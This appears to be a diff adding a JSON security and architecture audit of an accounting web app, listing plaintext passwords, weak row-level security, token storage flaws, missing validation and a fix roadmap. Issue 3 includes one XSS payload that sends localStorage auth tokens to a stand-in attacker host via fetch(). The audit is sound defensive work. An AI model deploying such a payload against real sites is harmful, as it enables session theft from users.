@@ -1,0 +1,594 @@
+{
+  "audit": {
+    "projectName": "ASOS Accounting Manager",
+    "auditDate": "2026-02-22",
+    "auditorLevel": "Senior Architect",
+    "productionReady": false,
+    "productionReadinessScore": 28,
+    "overallRiskLevel": "CRITICAL",
+    "estimatedFixTime": "4-6 weeks",
+    "teamSizeRecommended": 2
+  },
+  "criticalIssues": [
+    {
+      "id": 1,
+      "title": "Passwords Stored in Plain Text",
+      "severity": "CRITICAL",
+      "file": "supabase/schema.sql",
+      "lineNumber": 69,
+      "description": "Company login credentials stored without encryption or hashing",
+      "riskScenario": "Database breach → All company credentials and state tax accounts exposed",
+      "compliance": "Violates UZ Law on Personal Data Protection, GDPR compliance",
+      "exploitScenario": "Any database compromise leads to credentials theft. Attacker gains access to state systems.",
+      "fixComplexity": "Medium",
+      "fixTime": "1-2 days",
+      "solution": {
+        "approach": "Use bcrypt/argon2 for password hashing",
+        "steps": [
+          "Add bcrypt library to package.json",
+          "Create migration to add password_hash and password_salt columns",
+          "Hash all existing passwords with migration script",
+          "Update upsertCompany function to hash passwords",
+          "Never expose passwords to frontend",
+          "Add audit logging for password access"
+        ],
+        "codeExample": "password_hash = await bcrypt.hash(plainPassword, saltRounds: 12)"
+      },
+      "dataBreachProbability": "95%"
+    },
+    {
+      "id": 2,
+      "title": "Broken Row Level Security (RLS)",
+      "severity": "CRITICAL",
+      "files": [
+        "supabase/schema.sql",
+        "lib/permissions.ts"
+      ],
+      "vulnerabilities": [
+        {
+          "name": "No JWT signature verification in RLS queries",
+          "impact": "Token tampering is possible - RLS doesn't validate token authenticity",
+          "fix": "Implement JWT verification trigger in database"
+        },
+        {
+          "name": "Missing DELETE RLS policies",
+          "impact": "Users can delete other users' data through direct API calls",
+          "fix": "Add DELETE policies to ALL sensitive tables"
+        },
+        {
+          "name": "Recursive RLS queries",
+          "impact": "Potential infinite loops or exponential query time",
+          "fix": "Flatten RLS logic, use application-level authorization"
+        },
+        {
+          "name": "Session hijacking via localStorage",
+          "impact": "XSS attack can steal JWT token from localStorage, attacker can access user's data",
+          "fix": "Use HttpOnly cookies instead of localStorage"
+        }
+      ],
+      "fixTime": "2-3 days",
+      "checklist": [
+        "Implement JWT verification trigger",
+        "Add DELETE RLS policies to all tables",
+        "Add UPDATE RLS policies for sensitive fields",
+        "Create audit_log table with triggers",
+        "Migrate tokens from localStorage to HttpOnly cookies",
+        "Test RLS with multiple roles and cross-company access",
+        "Penetration test RLS bypass scenarios"
+      ]
+    },
+    {
+      "id": 3,
+      "title": "No Input Validation - XSS & SQL Injection Vectors",
+      "severity": "CRITICAL",
+      "files": [
+        "lib/supabaseData.ts",
+        "App.tsx",
+        "components/"
+      ],
+      "vulnerabilities": [
+        {
+          "type": "XSS (Cross-Site Scripting)",
+          "example": "Company name rendered without sanitization in JSX",
+          "exploitCode": "accountantName: '<img src=x onerror=\"fetch(\\\"http://attacker/steal?token=\\\" + localStorage.auth)\"/>'"
+        },
+        {
+          "type": "SQL Injection",
+          "note": "Reduced by Supabase parameterization, but not checked",
+          "risk": "If custom SQL or RPC functions are created, injection is possible"
+        }
+      ],
+      "fixTime": "2 days",
+      "solution": {
+        "install": ["npm install zod dompurify"],
+        "steps": [
+          "Create validation schemas with zod for all inputs",
+          "Install dompurify for HTML sanitization",
+          "Add Content Security Policy (CSP) header",
+          "Validate all API request bodies",
+          "Sanitize all user-generated content before rendering",
+          "Add pre-commit hooks to catch validation errors"
+        ]
+      }
+    },
+    {
+      "id": 4,
+      "title": "Race Conditions in Batch Operations",
+      "severity": "CRITICAL",
+      "file": "lib/supabaseData.ts",
+      "description": "Batch upsert operations not atomic - partial failures leave data inconsistent",
+      "failureScenario": "Import 1000 operations, 500 succeed, 500 timeout. System thinks all succeeded. On retry: duplicates.",
+      "fixTime": "1-2 days",
+      "solution": {
+        "approach": "Use database RPC for atomic operations",
+        "wrongWay": "for (op of operations) { supabase.from('operations').upsert(op) }",
+        "rightWay": "supabase.rpc('upsert_operations_atomic', { operations_input })",
+        "databaseFunction": "CREATE FUNCTION upsert_operations_atomic() RETURNS JSONB AS ...",
+        "feature": "Entire transaction succeeds or fails - no partial updates"
+      }
+    },
+    {
+      "id": 5,
+      "title": "Broken Session & Token Management",
+      "severity": "CRITICAL",
+      "files": [
+        "App.tsx",
+        "lib/supabaseClient.ts"
+      ],
+      "issues": [
+        {
+          "issue": "Tokens stored in localStorage (accessible to XSS)",
+          "impact": "Any XSS attack steals all auth tokens",
+          "fix": "Use HttpOnly cookies or sessionStorage with backend"
+        },
+        {
+          "issue": "signOut() doesn't revoke refresh token",
+          "impact": "After logout, attacker can still refresh session",
+          "fix": "Call auth.signOut({ scope: 'global' })"
+        },
+        {
+          "issue": "Incomplete storage cleanup on logout",
+          "impact": "Tokens remain in IndexedDB, cookies, sessionStorage",
+          "fix": "Clear all storage types, not just localStorage"
+        },
+        {
+          "issue": "No CSRF token in requests",
+          "impact": "State-changing requests can be performed from other domains",
+          "fix": "Add CSRF token to all POST/PUT/DELETE requests"
+        }
+      ],
+      "fixTime": "1 day",
+      "implementation": {
+        "step1": "Switch to sessionStorage or HttpOnly cookies",
+        "step2": "Implement proper logout with token revocation",
+        "step3": "Add CSRF protection middleware",
+        "step4": "Implement token rotation (refresh every 5 minutes)",
+        "step5": "Clear all storage on logout"
+      }
+    },
+    {
+      "id": 6,
+      "title": "No Error Boundary - App Crashes on Component Error",
+      "severity": "CRITICAL",
+      "file": "App.tsx",
+      "description": "Single component error crashes entire application",
+      "currentCode": "No error boundary wrapper",
+      "fixTime": "4 hours",
+      "solution": {
+        "approach": "Implement React Error Boundary",
+        "component": "Create ErrorBoundary.tsx",
+        "lifecycle": "componentDidCatch() hook",
+        "recovery": "Show error UI, allow user to reload",
+        "integration": "Wrap entire app in <ErrorBoundary></ErrorBoundary>"
+      }
+    }
+  ],
+  "highPriorityIssues": [
+    {
+      "id": 7,
+      "title": "N+1 Query Problem - 10-50x Performance Degradation",
+      "severity": "HIGH",
+      "file": "lib/supabaseData.ts",
+      "impact": "100 companies × 50 staff = 5000 array iterations (O(n^2))",
+      "fixTime": "1 day",
+      "problem": "Enriching data with staff names via array.find() in loop",
+      "solution": "Create staff lookup Map (O(1)) or use SQL JOINs"
+    },
+    {
+      "id": 8,
+      "title": "Extensive Use of `any` Type",
+      "severity": "HIGH",
+      "impact": "Type safety lost, runtime errors possible, difficult refactoring",
+      "fixTime": "2-3 days",
+      "solution": "Use TypeScript generics instead of `any`"
+    },
+    {
+      "id": 9,
+      "title": "Missing Null/Undefined Checks",
+      "severity": "HIGH",
+      "files": ["App.tsx", "components/"],
+      "examples": [
+        "newNotif.id - can be undefined",
+        "comp.accountantName - can be null",
+        "op.message - never checked for null"
+      ],
+      "fixTime": "2 days",
+      "solution": "Add nil-coalescing operators (??), optional chaining (?.)"
+    },
+    {
+      "id": 10,
+      "title": "No Retry Logic",
+      "severity": "HIGH",
+      "impact": "Network timeout on one user affects everyone",
+      "fixTime": "4 hours",
+      "solution": "Implement exponential backoff retry with MAX_RETRIES=3"
+    },
+    {
+      "id": 11,
+      "title": "No Rate Limiting",
+      "severity": "HIGH",
+      "vulnerability": "DDoS vulnerability, brute force password attacks possible",
+      "fixTime": "1 day",
+      "solution": "Add express-rate-limit middleware to backend"
+    }
+  ],
+  "databaseIssues": {
+    "missingIndexes": [
+      "idx_operations_period",
+      "idx_companies_active",
+      "idx_staff_company_id",
+      "idx_company_period_status (composite)"
+    ],
+    "missingConstraints": [
+      "Foreign key: operations.company_id → companies.id",
+      "Foreign key: operations.assigned_accountant_id → staff.id",
+      "Check constraint: created_at <= updated_at"
+    ],
+    "normalizationIssues": "Company notes field contains JSON - should be separate tables",
+    "estimatedFixTime": "1-2 days"
+  },
+  "architectureIssues": {
+    "description": "Monolithic SPA without backend service layer",
+    "issues": [
+      {
+        "issue": "Frontend directly queries database",
+        "problem": "No validation, business logic scattered in components",
+        "solution": "Add Node.js/Express backend API layer"
+      },
+      {
+        "issue": "30+ useState hooks in App.tsx",
+        "problem": "Unmaintainable, prop drilling, hard to track state",
+        "solution": "Implement Zustand or Redux for state management"
+      },
+      {
+        "issue": "Component coupling is too tight",
+        "problem": "Sidebar, Dashboard, modules all interdependent",
+        "solution": "Use context API or dependency injection"
+      },
+      {
+        "issue": "No separation of concerns",
+        "problem": "Components have data fetching, validation, UI rendering mixed",
+        "solution": "Use custom hooks for data logic (useCompanies, useStaff, etc.)"
+      }
+    ]
+  },
+  "securityAudit": {
+    "authentication": {
+      "status": "BROKEN",
+      "issues": [
+        "Plain text passwords in DB",
+        "JWT tokens in localStorage (XSS-vulnerable)",
+        "No token refresh rotation",
+        "Logout doesn't revoke tokens"
+      ]
+    },
+    "authorization": {
+      "status": "BROKEN",
+      "issues": [
+        "RLS policies incomplete",
+        "No signature verification",
+        "Missing DELETE policies",
+        "No audit trail for changes"
+      ]
+    },
+    "dataProtection": {
+      "status": "FAILED",
+      "issues": [
+        "Credentials stored plaintext",
+        "No encryption at rest",
+        "No field-level encryption",
+        "No data classification"
+      ]
+    },
+    "inputValidation": {
+      "status": "MISSING",
+      "issues": [
+        "No XSS protection",
+        "No SQL injection checks (relying on Supabase only)",
+        "No size limits on file uploads",
+        "No rate limiting on API"
+      ]
+    },
+    "riskMatrix": {
+      "dataBreachProbability": "95%",
+      "unauthorizedAccessRisk": "85%",
+      "dataLossRisk": "75%",
+      "complianceViolation": "CRITICAL"
+    }
+  },
+  "performanceAudit": {
+    "issues": [
+      {
+        "area": "Query Performance",
+        "problem": "N+1 queries load all data at once",
+        "impact": "5-50x slower than optimal",
+        "fix": "Implement pagination, use JOINs, create indexes"
+      },
+      {
+        "area": "Frontend Rendering",
+        "problem": "Large components, no code splitting",
+        "impact": "Slow initial load, poor Time to Interactive",
+        "fix": "Implement React.lazy, improve component structure"
+      },
+      {
+        "area": "Caching",
+        "problem": "No client-side caching strategy",
+        "impact": "Every action re-fetches all data",
+        "fix": "Implement React Query or SWR with smart staleTime"
+      },
+      {
+        "area": "Bundle Size",
+        "problem": "Unknown - likely > 2MB with dependencies",
+        "impact": "Slow page load",
+        "fix": "Analyze with webpack-bundle-analyzer, tree-shake unused code"
+      }
+    ],
+    "scorecard": {
+      "loadTime": "Unknown",
+      "firstPaint": "Unknown",
+      "timeToInteractive": "Unknown",
+      "largestContentfulPaint": "Unknown"
+    }
+  },
+  "refactorRoadmap": {
+    "phase1": {
+      "name": "CRITICAL SECURITY FIX",
+      "duration": "1-2 weeks",
+      "priority": "MAXIMUM",
+      "tasks": [
+        {
+          "id": 1,
+          "task": "Hash passwords",
+          "duration": "1-2 days",
+          "subtasks": [
+            "Add bcrypt to package.json",
+            "Create migration for password_hash column",
+            "Hash existing passwords",
+            "Update upsert functions",
+            "Remove password from API responses"
+          ]
+        },
+        {
+          "id": 2,
+          "task": "Fix RLS policies",
+          "duration": "2-3 days",
+          "subtasks": [
+            "Add JWT verification trigger",
+            "Add missing DELETE policies",
+            "Add missing UPDATE policies",
+            "Create audit triggers",
+            "Test with different roles"
+          ]
+        },
+        {
+          "id": 3,
+          "task": "Input validation",
+          "duration": "1-2 days",
+          "subtasks": [
+            "Install zod + dompurify",
+            "Create validation schemas",
+            "Add sanitization middleware",
+            "Update all API routes"
+          ]
+        },
+        {
+          "id": 4,
+          "task": "Session management",
+          "duration": "1 day",
+          "subtasks": [
+            "Migrate to HttpOnly cookies or sessionStorage",
+            "Implement proper logout",
+            "Add token rotation",
+            "Add CSRF protection"
+          ]
+        },
+        {
+          "id": 5,
+          "task": "Error boundaries",
+          "duration": "4 hours",
+          "subtasks": [
+            "Create ErrorBoundary component",
+            "Wrap App.tsx",
+            "Setup error reporting"
+          ]
+        }
+      ]
+    },
+    "phase2": {
+      "name": "ARCHITECTURE REFACTOR",
+      "duration": "2-3 weeks",
+      "priority": "HIGH",
+      "tasks": [
+        {
+          "task": "State Management",
+          "duration": "1 week",
+          "implementation": "Zustand or Redux"
+        },
+        {
+          "task": "Backend Service Layer",
+          "duration": "1 week",
+          "implementation": "Express.js or similar"
+        },
+        {
+          "task": "Component Restructuring",
+          "duration": "1 week",
+          "implementation": "Split App.tsx, feature folders"
+        }
+      ]
+    },
+    "phase3": {
+      "name": "PERFORMANCE",
+      "duration": "1 week",
+      "priority": "MEDIUM",
+      "tasks": [
+        "Pagination",
+        "React Query",
+        "Database indexes",
+        "Code splitting"
+      ]
+    },
+    "phase4": {
+      "name": "MONITORING",
+      "duration": "1 week",
+      "priority": "MEDIUM",
+      "tasks": [
+        "Error tracking (Sentry)",
+        "Performance monitoring",
+        "Logging setup",
+        "CI/CD pipeline"
+      ]
+    }
+  },
+  "quickWins": [
+    {
+      "task": "Add Error Boundary",
+      "time": "1 hour",
+      "impact": "Prevents app crashes"
+    },
+    {
+      "task": "Add null safety checks",
+      "time": "2 hours",
+      "impact": "Prevents runtime errors"
+    },
+    {
+      "task": "Extract hardcoded constants",
+      "time": "1 hour",
+      "impact": "Maintainability"
+    },
+    {
+      "task": "Add input sanitization",
+      "time": "2 hours",
+      "impact": "Prevents XSS"
+    },
+    {
+      "task": "Implement retry logic",
+      "time": "2 hours",
+      "impact": "Reliability"
+    },
+    {
+      "task": "Add logging",
+      "time": "1 hour",
+      "impact": "Debugging"
+    }
+  ],
+  "productionReadinessChecklist": {
+    "security": {
+      "passwordHashing": false,
+      "rlsVerified": false,
+      "inputValidation": false,
+      "csrfProtection": false,
+      "rateLimiting": false,
+      "sessionManagement": false,
+      "environmentVariables": false,
+      "sqlInjectionPrevention": false
+    },
+    "performance": {
+      "databaseIndexes": false,
+      "n1Eliminated": false,
+      "lazyLoading": false,
+      "caching": false,
+      "pagination": false,
+      "bundleSize": false,
+      "apiResponseTime": false
+    },
+    "reliability": {
+      "errorBoundaries": false,
+      "retryLogic": false,
+      "errorHandling": false,
+      "transactionSafety": false,
+      "dataConsistency": false
+    },
+    "operations": {
+      "errorTracking": false,
+      "performanceMonitoring": false,
+      "healthCheck": false,
+      "logging": false,
+      "backupStrategy": false,
+      "disasterRecovery": false,
+      "runbookDocumentation": false
+    },
+    "codeQuality": {
+      "noAnyTypes": false,
+      "unitTests": false,
+      "integrationTests": false,
+      "e2eTests": false,
+      "codeReview": false,
+      "linting": false,
+      "typeChecking": false
+    }
+  },
+  "scores": {
+    "security": 15,
+    "performance": 35,
+    "codeQuality": 40,
+    "architecture": 50,
+    "operations": 20,
+    "overall": 28
+  },
+  "riskAssessment": {
+    "dataBreachProbability": "95%",
+    "dataLossProbability": "85%",
+    "businessLogicErrorsProbability": "70%",
+    "availabilityRisk": "60%",
+    "verdict": "DO NOT DEPLOY TO PRODUCTION"
+  },
+  "recommendations": {
+    "immediate": [
+      "Hash all passwords",
+      "Fix RLS policies",
+      "Add input validation",
+      "Fix session management",
+      "Add error boundaries"
+    ],
+    "shortTerm": [
+      "Implement retry logic",
+      "Add null checks",
+      "Extract constants",
+      "Setup logging",
+      "Add rate limiting"
+    ],
+    "mediumTerm": [
+      "Refactor state management",
+      "Add pagination",
+      "Create backend API",
+      "Add database indexes",
+      "Implement caching"
+    ],
+    "longTerm": [
+      "Comprehensive testing",
+      "Error tracking service",
+      "Performance monitoring",
+      "CI/CD pipeline",
+      "Documentation"
+    ]
+  },
+  "estimatedTimeline": {
+    "phase1_security": "1-2 weeks",
+    "phase2_architecture": "2-3 weeks",
+    "phase3_performance": "1 week",
+    "phase4_monitoring": "1 week",
+    "totalTime": "4-6 weeks",
+    "teamSize": "2-3 senior engineers",
+    "productionDeployment": "End of week 6"
+  }
+}
